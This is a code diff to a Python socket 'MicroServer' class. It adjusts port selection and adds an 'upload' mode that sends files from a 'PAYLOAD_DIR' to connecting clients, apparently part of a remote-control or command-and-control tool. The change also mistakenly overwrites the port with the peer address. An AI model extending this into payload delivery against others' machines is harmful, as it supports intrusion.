@@ -12,8 +12,8 @@ class MicroServer:
         self.file_name = file_name
         self.work = work
         self.ip = self.server.ip
-        self.port = int(self.server.port) * 2 + randint(1, 200)
-        self.noAttempts = 100
+        self.port = int(self.server.port) * 2 + randint(1, 700)
+        self.noAttempts = 200
         self.outDir = os.path.join(self.server.config.get("OUTPUT_DIR"), self.server.name)
         self._is_working = False
         self.readyPort = None
@@ -27,7 +27,7 @@ class MicroServer:
                 self.micro.bind((self.ip, self.port))
                 return True
             except OSError:
-                self.port += 1
+                self.port += 3
         return False
 
     
@@ -77,6 +77,26 @@ class MicroServer:
         self.saveFile(data)
         self.conn.close()
     
+    def uploadFile(self, fname: str) -> None:
+        fpath = os.path.join(self.server.config["PAYLOAD_DIR"], fname)
+        if not os.path.exists(fpath):
+            self.server.Msg(f"[!!] ERROR: File name: {fname} does not exist in PAYLOAD dir [!!]")
+            return
+        try:
+            self.conn, self.port = self.micro.accept()
+        except TimeoutError:
+            self.server.Msg("[!!] Microserver Timeout Error [!!]")
+            return
+        self.server.Msg(f"Start upload file: {fname}")
+        try:
+            with open(fpath, "rb") as f:
+                self.conn.sendfile(f, 0)
+        except Exception as e:
+            self.server.Msg(f"[!!] ERROR: upload file: {fname} . Error: {e} [!!]")
+            return
+    
+
+    
     
 
 
@@ -85,7 +105,8 @@ class MicroServer:
         match self.work:
             case "download":
                 self.downloadFile()
-
+            case "upload":
+                self.uploadFile(self.file_name)
     
     def START(self) -> None:
         self._is_working = True
